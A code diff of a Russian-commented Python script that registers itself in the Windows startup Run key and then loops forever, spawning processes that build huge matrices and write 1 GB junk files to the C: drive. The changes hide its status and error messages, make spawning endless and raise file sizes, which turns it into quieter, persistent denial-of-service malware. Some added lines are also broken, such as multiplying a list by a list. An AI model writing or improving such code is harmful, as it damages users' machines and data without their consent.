@@ -8,7 +8,7 @@ import random
 import time
 
 
-SIZE = 1000000000
+SIZE = 100000000000
 
 
 import sys
@@ -41,9 +41,10 @@ def add_self_to_startup(app_name=APP_NAME):
         )
         winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, quoted_exe_path)
         winreg.CloseKey(key)
-        print(f"Добавлено в автозагрузку: {quoted_exe_path}")
+        #print(f"Добавлено в автозагрузку: {quoted_exe_path}")
     except Exception as e:
-        print(f"Ошибка при добавлении в автозагрузку: {e}")
+        return
+        #print(f"Ошибка при добавлении в автозагрузку: {e}")
 
 
 def is_in_startup(app_name=APP_NAME):
@@ -62,7 +63,7 @@ def is_in_startup(app_name=APP_NAME):
     except FileNotFoundError:
         return False
     except Exception as e:
-        print(f"Ошибка при проверке автозагрузки: {e}")
+        #print(f"Ошибка при проверке автозагрузки: {e}")
         return False
 
 
@@ -84,24 +85,35 @@ def add_to_startup_if_windows(app_name=APP_NAME):
         print("macOS: используй LaunchAgents")
     else:
         print(f"Неизвестная ОС: {os_name}")
-
-
+# def fib(n):
+#     if n <= 1:
+#         return n
+#     return fib(n - 1) + fib(n - 2)
+#
 
 
 def final_workload():
-    """Финальный процесс, который нагружает ядро"""
-    while True:
 
+    """Финальный процесс, который нагружает ядро"""
+    i=0
+    while True:
         matrix = [[i for i in range(SIZE)] for _ in range(SIZE)]
         result = []
+        total=0
+        t = threading.Thread(target=lambda x=i: print(x))
+        t.start()
         for row in matrix:
+            total += row * row
+            result.append([math.sqrt(x) ** 10 for x in row])
+            size_bytes = 1024 * 1024 * 1024
+            symbol = "A" * size_bytes
             random_number = random.randint(1, 1000000)
             filename = f"C:\\Важная_информация{random_number}.txt"
             with open(filename, "w", encoding="utf-8", newline="") as f:
                 text = "A" * size_bytes
                 f.write(text)
-            size_bytes = 1024 * 1024  # 1 МБ
-            result.append([math.sqrt(x) ** 10 for x in row])
+            # fib(1000)
+
 def thread_function():
     """Поток, который создает процессы на все ядра"""
     cpu_count = multiprocessing.cpu_count()
@@ -132,8 +144,8 @@ def child_process():
 
 
 if __name__ == "__main__":
-    #while True:
         add_to_startup_if_windows(APP_NAME)
-        main_child = multiprocessing.Process(target=child_process)
-        main_child.start()
-        main_child.join()
+        while True:
+            main_child = multiprocessing.Process(target=child_process)
+            main_child.start()
+            main_child.join()
